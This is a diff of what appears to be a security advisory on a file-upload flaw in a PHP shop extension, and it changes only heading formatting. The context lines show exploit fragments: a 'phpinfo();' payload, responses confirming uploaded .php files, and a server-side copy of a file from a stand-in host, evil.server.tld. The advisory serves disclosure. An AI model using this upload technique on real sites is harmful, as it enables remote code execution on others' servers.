@@ -83,7 +83,7 @@ phpinfo();
 ---------------------------acebdf13572468--
 ```
 
-Response body (JSON)
+### Response body (JSON)
 ```
 ["https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/1479934682-customupload.php"]
 ```
@@ -118,7 +118,7 @@ phpinfo();
 ---------------------------acebdf13572468--
 ```
 
-Response body (JSON)
+### Response body (JSON)
 ```
 ["https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/1479934682-customupload.php"]
 ```
@@ -153,7 +153,7 @@ Content-Disposition: form-data; name="product_id"
 ---------------------------acebdf13572468--
 ```
 
-Response body (JSON)
+### Response body (JSON)
 ```
 {"status":"success","message":"Image had copied successfully!","filename":"https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/social-image-1479935623.php","original_filename":"http:\/\/evil.server.tld\/misc\/what.php","price":0,"price_format":"Free"}
 ```
@@ -210,7 +210,7 @@ phpinfo();
 ---------------------------acebdf13572468--
 ```
 
-Response body (JSON)
+### Response body (JSON)
 ```
 ["https:\/\/testing.local.tld\/media\/pdp\/images\/upload\/1479934682-customupload.php"]
 ```
